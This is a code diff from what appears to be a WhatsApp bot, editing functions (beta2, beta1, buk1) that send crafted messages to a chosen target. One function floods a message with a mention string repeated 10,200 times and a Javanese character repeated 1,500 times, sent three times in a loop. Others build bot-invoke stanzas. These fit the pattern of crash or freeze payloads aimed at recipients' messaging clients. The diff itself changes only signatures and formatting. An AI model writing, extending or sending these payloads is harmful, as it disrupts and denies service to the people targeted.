@@ -1,9 +1,10 @@
-exports.beta2 = async (viper, target, Ptcp = true) => {
+exports.beta2 = async (viper, target, cct = true, Ptcp = true) => {
 const crypto = require('crypto')
 const fs = require('fs')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
-	const jids = `_*~@13135550002~*_\n`.repeat(10200);
-	const ui = 'ꦽ'.repeat(1500);
+const jids = `_*~@13135550002~*_\n`.repeat(10200);
+const ui = 'ꦽ'.repeat(1500);
+
     for (let i = 0; i < 3; i++) {
     await viper.relayMessage(target, {
      ephemeralMessage: {
@@ -77,11 +78,11 @@ const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
 	}
 
 
-exports.beta1 = async (viper, target, Ptcp = true) => {
-    const crypto = require('crypto');
-    const fs = require('fs'); // Pastikan fs di-import
-    const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
-    const stanza = [
+exports.beta1 = async (viper, target) => {
+const crypto = require('crypto');
+const fs = require('fs'); // Pastikan fs di-import
+const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
+const stanza = [
         {
             attrs: { biz_bot: '1' },
             tag: "bot",
@@ -231,10 +232,11 @@ ticket_id: crypto.randomBytes(16),
     }
 };
 
-exports.buk1 = async (viper, target, Ptcp = true) => {
+exports.buk1 = async (viper, target, cct = true, Ptcp = true) => {
 const crypto = require('crypto')
 const fs = require('fs')
 const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
+
     try {
                 const message = {
             botInvokeMessage: {
